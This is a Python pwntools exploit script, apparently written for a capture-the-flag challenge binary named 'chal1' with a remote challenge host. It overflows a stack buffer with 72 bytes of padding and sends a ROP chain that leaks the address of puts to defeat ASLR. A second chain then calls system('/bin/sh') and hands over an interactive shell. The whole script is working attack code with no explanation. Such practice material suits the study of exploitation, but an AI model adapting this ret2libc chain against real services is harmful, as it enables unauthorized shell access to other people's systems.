#!/usr/bin/env python3

PROG_PATH = "./chal1"
LIBC_PATH = "./libc6_2.39-0ubuntu8.6_amd64.so"

REMOTE = "6447.lol"
REMOTE_PORT = 1234

from pwn import *

########## helpers ##########

# for easier logging
from icecream import ic
import pprint
ic.configureOutput(
    argToStringFunction=lambda x: f"{hex(x)} ({x})" if isinstance(x, int) else pprint.pformat(x)
)

# macros/convenience functions
def hex_to_int_after(r: tube, data: bytes, end=b"\n"):
    r.recvuntil(data)
    return int(r.recvuntil(end, drop=True), 16)

#############################

context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["zellij", "action", "new-pane", "-d", "right", "-c", "--", "zsh", "-c"]

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or PROG_PATH)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries(LIBC_PATH)
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF(LIBC_PATH)

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(REMOTE, REMOTE_PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# GDB will be launched if the exploit is run via ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE                     #
#===========================================================

r = start()

# r.recvuntil(b"let me tell you something: ")
# puts = int(r.recvline(), 16)
# ic(puts)

puts_plt = 0x401070
puts_got = 0x403fd8
main = 0x401261

ret = 0x401016
pop_rdi_ret = 0x401166

chain = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)

r.sendline(b"A" * 72 + chain)

r.recvuntil(b"don't say that!\n")
puts = u64(r.recvn(6) + b"\x00\x00")
ic(puts)
libc.address = puts - libc.symbols["puts"]

str_bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols["system"]

chain2 = p64(pop_rdi_ret) + p64(str_bin_sh) + p64(ret) + p64(system)

r.sendline(b"B" * 72 + chain2)

r.interactive()
